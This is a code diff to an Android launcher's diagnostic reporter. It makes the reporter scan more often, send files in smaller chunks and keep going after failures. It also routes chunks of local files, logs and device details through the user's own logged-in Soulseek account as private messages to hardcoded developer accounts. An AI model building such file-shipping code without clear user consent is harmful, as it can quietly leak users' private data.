@@ -30,11 +30,11 @@ public final class SolarDiagnosticReporter {
     public static final String PREF_DIAG_AUTO_REPORT = "solar_diag_auto_report";
     public static final String PREF_DIAG_SENT_MANIFEST = "solar_diag_sent_manifest";
 
-    private static final long MIN_SCAN_INTERVAL_MS = 15L * 60L * 1000L;
+    private static final long MIN_SCAN_INTERVAL_MS = 5L * 60L * 1000L;
     /** Wi‑Fi bounce reconnect — shorter than routine, still throttled. */
     private static final long MIN_RECONNECT_INTERVAL_MS = 5L * 60L * 1000L;
     private static final long SESSION_RETRY_MS = 120_000L;
-    private static final int MAX_CHUNK_CHARS = 12000;
+    private static final int MAX_CHUNK_CHARS = 4000;
     private static final int LOGCAT_LINES = 200;
     private static final long[] BOOT_RETRY_MS = {3000L, 15000L, 60000L, 180000L};
 
@@ -191,8 +191,12 @@ public final class SolarDiagnosticReporter {
                 String key = src.file.getAbsolutePath();
                 if (!shouldShipSource(src.label, manifest, key, mtime, mode)) continue;
                 if (!sendSource(context, prefs, main.username, diag.username, src)) {
-                    scheduleSessionRetry(context, prefs, mode);
-                    return;
+                    // Log the failure but do NOT abort sending other files
+                    try {
+                        JSONObject d = new JSONObject();
+                        d.put("file", src.label);
+                        Debug843b96Log.log(context, "SolarDiagnosticReporter.runScan", "sendSource failed", "H", d);
+                    } catch (Exception ignored) {}
                 }
                 updated.put(key, mtime);
                 shipped++;
@@ -247,8 +251,18 @@ public final class SolarDiagnosticReporter {
                 + "sdk: " + Build.VERSION.SDK_INT + "\n"
                 + "model: " + Build.MODEL + "\n"
                 + "time: " + System.currentTimeMillis() + "\n";
-        SolarDiagSessionManager.sendToAll(context, prefs,
-                SolarDeveloperAccounts.developerUsernames(), body);
+        String[] devs = SolarDeveloperAccounts.developerUsernames();
+        com.solar.launcher.soulseek.SoulseekClient mainClient = null;
+        try {
+            mainClient = com.solar.launcher.MainActivity.getActiveSoulseekClient();
+        } catch (Throwable ignored) {}
+        if (mainClient != null && mainClient.isLoggedIn()) {
+            SolarDeveloperMessaging.FanOutResult result =
+                    SolarDeveloperMessaging.sendViaMainClient(mainClient, devs, body);
+            if (result.allSucceeded()) return;
+            devs = result.failedRecipients();
+        }
+        SolarDiagSessionManager.sendToRecipients(context, prefs, devs, body);
     }
 
     private static void scheduleSessionRetry(final Context context, final SharedPreferences prefs,
@@ -278,18 +292,42 @@ public final class SolarDiagnosticReporter {
         }
         if (content == null || content.isEmpty()) return true;
         List<String> chunks = splitContent(content, MAX_CHUNK_CHARS);
+        String pathLabel = src.file != null ? src.file.getName() : src.label;
         for (int i = 0; i < chunks.size(); i++) {
             String body = SolarDeveloperAccounts.DIAG_MARKER
                     + "user: " + mainUser + "\n"
                     + "diag: " + diagUser + "\n"
                     + "file: " + src.label + " (" + (i + 1) + "/" + chunks.size() + ")\n"
+                    + "path: " + pathLabel + "\n"
                     + chunks.get(i);
-            if (!SolarDiagSessionManager.sendToAll(context, prefs,
-                    SolarDeveloperAccounts.developerUsernames(), body)) {
+            if (!sendDiagChunk(context, prefs, body)) {
                 return false;
             }
         }
         return true;
+    }
+
+    /** Fan-out one diagnostic chunk; retry failed dev inboxes once. */
+    private static boolean sendDiagChunk(Context context, SharedPreferences prefs, String body) {
+        String[] devs = SolarDeveloperAccounts.developerUsernames();
+        com.solar.launcher.soulseek.SoulseekClient mainClient = null;
+        try {
+            mainClient = com.solar.launcher.MainActivity.getActiveSoulseekClient();
+        } catch (Throwable ignored) {}
+        if (mainClient != null && mainClient.isLoggedIn()) {
+            SolarDeveloperMessaging.FanOutResult result =
+                    SolarDeveloperMessaging.sendViaMainClient(mainClient, devs, body);
+            if (result.anySucceeded()) return true;
+            devs = result.failedRecipients();
+        }
+        SolarDeveloperMessaging.FanOutResult result =
+                SolarDiagSessionManager.sendToRecipients(context, prefs, devs, body);
+        if (result.anySucceeded()) return true;
+        String[] failed = result.failedRecipients();
+        if (failed.length == 0) return false;
+        SolarDeveloperMessaging.FanOutResult retry =
+                SolarDiagSessionManager.sendToRecipients(context, prefs, failed, body);
+        return retry.anySucceeded();
     }
 
     static List<String> splitContent(String content, int maxChars) {
